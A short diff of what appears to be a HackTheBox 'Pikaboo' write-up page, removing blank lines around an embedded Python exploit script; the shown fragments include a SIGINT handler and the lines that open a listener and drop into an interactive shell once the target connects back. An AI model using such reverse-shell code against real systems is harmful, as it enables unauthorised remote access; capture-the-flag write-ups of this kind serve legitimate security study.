@@ -16,7 +16,6 @@ import urllib3
 import base64
 import os
 
-
 def def_handler(sig, frame):
     print("Saliendo...")
     sys.exit(1)
@@ -93,8 +92,6 @@ if __name__ == '__main__':
 
 shell = listen(lport, timeout=20).wait_for_connection()
 shell.interactive()
-
-
 ```
 
 <h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px;">Pikaboo - HackTheBox</h2>
